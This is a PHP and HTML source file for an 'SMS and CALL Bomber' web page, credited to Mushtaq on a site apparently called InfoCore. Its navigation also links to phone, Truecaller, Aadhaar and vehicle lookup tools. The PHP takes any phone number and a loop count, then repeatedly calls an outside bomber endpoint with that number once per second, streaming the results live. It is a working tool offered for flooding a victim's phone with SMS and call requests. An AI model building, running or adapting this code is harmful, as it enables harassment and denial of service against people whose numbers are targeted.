<?php
if (isset($_GET['ajax']) && $_GET['ajax'] == '1') {
    @ini_set('zlib.output_compression', 0);
    @ini_set('output_buffering', 'Off');
    @ini_set('implicit_flush', '1');
    
    while (ob_get_level() > 0) {
        @ob_end_flush();
    }
    ob_implicit_flush(1);

    header('Content-Type: text/event-stream');
    header('Cache-Control: no-cache');
    header('Connection: keep-alive');
    header('X-Accel-Buffering: no');

    $phone = $_GET['phone'] ?? '';
    $duration = $_GET['duration'] ?? '';

    if (empty($phone) || empty($duration)) {
        echo "data: <div style='color: var(--error);'>Please fill in all fields.</div>\n\n";
        flush();
        exit;
    }

    // Padding to bypass buffer
    echo "data: " . str_repeat(" ", 1024) . "\n\n";
    echo "data: <div style='color: var(--success);'>Starting requests for: " . htmlspecialchars($phone) . "</div>\n\n";
    flush();

    $max_loops = (int)$duration;
    for ($i = 1; $i <= $max_loops; $i++) {
        
        // --- YOUR URL IS CALLED HERE CONTINUOUSLY ---
        // Change the URL below to your actual link. We append the phone number to it.
        $targetUrl = "https://vishal.lovestoblog.com/bomber4.php?phone=" . urlencode($phone); // <-- CHANGE THIS URL
        
        // Fetch response from that URL
        $response = @file_get_contents($targetUrl);
        
        if ($response === FALSE) {
            $apiStatus = "Failed to reach URL";
        } else {
            // Trim response to keep logs clean
            $apiStatus = substr(strip_tags($response), 0, 50); 
        }

        // Print live result to browser
        echo "data: <div>[Request #$i] Called URL -> Status: <b>$apiStatus</b></div>\n\n";
        flush(); 

        // Stop if user clicked stop button
        if (connection_aborted()) {
            break;
        }

        sleep(1); // 1-second delay between each hit
    }

    echo "data: <div style='color: var(--primary); font-weight: bold;'>Process Finished!</div>\n\n";
    flush();
    exit;
}
?>
<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SMS and CALL Bomber by Mushtaq — InfoCore</title>
    <meta name="description" content="SMS and CALL Bomber utility by Mushtaq on InfoCore." />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="style.css?v=4.0" />
</head>
<body>

  <!-- Floating Navigation Bar -->
  <header class="navbar-wrapper">
    <nav class="floating-navbar">
      <a href="/" class="nav-brand">
        <div class="nav-logo">
          <svg width="28" height="28" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="32" cy="18" r="11" fill="#0080FF" />
            <path d="M20 38C20 31.3726 25.3726 26 32 26C38.6274 26 44 31.3726 44 38V68C44 74.6274 38.6274 80 32 80C25.3726 80 20 74.6274 20 68V38Z" fill="#0080FF" />
            <path fill-rule="evenodd" clip-rule="evenodd" d="M38 48C38 35.8497 47.8497 26 60 26C72.1503 26 82 35.8497 82 48C82 60.1503 72.1503 70 60 70H54V80H60C77.6731 80 92 65.6731 92 48C92 30.3269 77.6731 16 60 16C42.3269 16 28 30.3269 28 48V54H38V48Z" fill="currentColor" />
          </svg>
        </div>
        <span class="brand-title">Info<span class="brand-accent">Core</span></span>
      </a>

      <!-- Nav Links -->
      <div class="nav-pill-menu" id="navMenu">
        <a href="/phone" class="nav-pill">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.18h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.18 6.18l1.81-1.81a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
          Phone
        </a>
        <a href="/truecaller" class="nav-pill">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13A19.79 19.79 0 0 1 3 2h3a2 2 0 0 1 2 1.72z"/></svg>
          Truecaller
        </a>
        <a href="/aadhar" class="nav-pill">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><line x1="7" y1="8" x2="17" y2="8"/><line x1="7" y1="12" x2="13" y2="12"/><line x1="7" y1="16" x2="11" y2="16"/></svg>
          Aadhaar
        </a>
        <a href="/vehicle" class="nav-pill">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="3" width="15" height="13" rx="1"/><path d="M16 8h4l3 5v3h-7V8z"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
          Vehicle
        </a>
        <a href="/insta" class="nav-pill">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/></svg>
          Insta Saver
        </a>
        <a href="/bomber" class="nav-pill active">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
          Bomber
        </a>
      </div>

      <!-- Controls Right -->
      <div class="nav-actions">
        <button class="theme-toggle-btn" onclick="toggleTheme()" title="Toggle Light/Dark Mode">
          <svg class="sun-icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
          <svg class="moon-icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
        </button>

        <button class="mobile-menu-btn" onclick="toggleMobileMenu()" aria-label="Toggle Mobile Menu">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
        </button>
      </div>
    </nav>

    <!-- Mobile Navigation Sheet Overlay -->
    <div class="mobile-nav-sheet" id="mobileSheet">
      <div class="sheet-grid">
        <a href="/phone" class="sheet-item">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.18h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.18 6.18l1.81-1.81a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
          <span>Phone Lookup</span>
        </a>
        <a href="/truecaller" class="sheet-item">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13A19.79 19.79 0 0 1 3 2h3a2 2 0 0 1 2 1.72z"/></svg>
          <span>Truecaller Info</span>
        </a>
        <a href="/aadhar" class="sheet-item">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><line x1="7" y1="8" x2="17" y2="8"/><line x1="7" y1="12" x2="13" y2="12"/><line x1="7" y1="16" x2="11" y2="16"/></svg>
          <span>Aadhaar Info</span>
        </a>
        <a href="/vehicle" class="sheet-item">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="3" width="15" height="13" rx="1"/><path d="M16 8h4l3 5v3h-7V8z"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
          <span>Vehicle Info</span>
        </a>
        <a href="/insta" class="sheet-item">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/></svg>
          <span>Insta Saver</span>
        </a>
        <a href="/bomber" class="sheet-item active">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
          <span>Bomber</span>
        </a>
      </div>
    </div>
  </header>

  <!-- Main Content Wrapper -->
  <main class="main-content">
    <div class="content-container">

      <!-- ===== LIVE URL RUNNER SECTION ===== -->
      <section class="tool-panel">
        <a href="/" class="back-home-btn">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
          <span>Back to Home</span>
        </a>

        <div class="panel-header">
          <h2>SMS and CALL Bomber</h2>
          <p>Send SMS and call requests to any phone number by Mushtaq.</p>
        </div>

        <div class="card search-box">
          <form id="bomberForm">
            <div class="form-group">
              <label for="phone">Phone Number</label>
              <div class="input-row">
                <div class="input-field-wrapper">
                  <svg class="field-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.18h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.18 6.18l1.81-1.81a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
                  <input type="text" id="phone" name="phone" required placeholder="Enter phone number" />
                </div>
              </div>
            </div>

            <div class="form-group">
              <label for="duration">Duration / Loops Count</label>
              <div class="input-row">
                <div class="input-field-wrapper">
                  <svg class="field-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>
                  <input type="number" id="duration" name="duration" required placeholder="Enter loops (e.g. 10)" />
                </div>
              </div>
            </div>

            <div style="display: flex; gap: 10px; justify-content: center; margin-top: 8px;">
              <button type="submit" id="startBtn" class="btn btn-primary" style="flex: 1;">
                <span>Start Process</span>
              </button>
              <button type="button" id="stopBtn" class="btn" style="flex: 1; background-color: var(--error); border-color: var(--error); display: none;">
                <span>Stop Process</span>
              </button>
            </div>
          </form>
        </div>

        <div class="card">
          <h3 style="margin-bottom: 12px; font-size: 15px; font-weight: 600;">Live Logs & Responses:</h3>
          <div id="result" style="padding: 8px; background-color: var(--bg-input); border-radius: 8px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12.5px; color: var(--text-muted);">
            Awaiting input...
          </div>
        </div>

      </section>

    </div>
  </main>

  <!-- Clean Footer -->
  <footer class="footer">
    <div class="footer-container">
      <span>InfoCore Intelligence Engine</span>
      <span class="footer-divider">•</span>
      <span>Made by <strong>Mushtaq</strong></span>
    </div>
  </footer>

  <script src="app.js"></script>
  <script>
let abortController = null;

document.getElementById('bomberForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const phone = document.getElementById('phone').value;
    const duration = document.getElementById('duration').value;
    const resultDiv = document.getElementById('result');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');

    resultDiv.innerHTML = "";
    startBtn.style.display = 'none';
    stopBtn.style.display = 'block';

    abortController = new AbortController();
    const url = `bomber4.php?ajax=1&phone=${encodeURIComponent(phone)}&duration=${encodeURIComponent(duration)}`;

    try {
        const response = await fetch(url, { signal: abortController.signal });
        const reader = response.body.getReader();
        const decoder = new TextDecoder();

        while (true) {
            const { value, done } = await reader.read();
            if (done) break;

            const chunk = decoder.decode(value, { stream: true });
            const lines = chunk.split('\n\n');
            
            lines.forEach(line => {
                if (line.startsWith('data: ')) {
                    const content = line.replace('data: ', '');
                    if (content.trim() !== '') {
                        resultDiv.innerHTML += content + '<br>';
                        resultDiv.scrollTop = resultDiv.scrollHeight;
                    }
                }
            });
        }
    } catch (error) {
        if (error.name === 'AbortError') {
            resultDiv.innerHTML += "<div style='color: var(--accent-yellow);'>Process stopped by user.</div>";
        } else {
            resultDiv.innerHTML += "<div style='color: var(--error);'>Connection closed.</div>";
        }
    } finally {
        startBtn.style.display = 'block';
        stopBtn.style.display = 'none';
    }
});

document.getElementById('stopBtn').addEventListener('click', function() {
    if (abortController) {
        abortController.abort();
    }
});
</script>

</body>
</html>
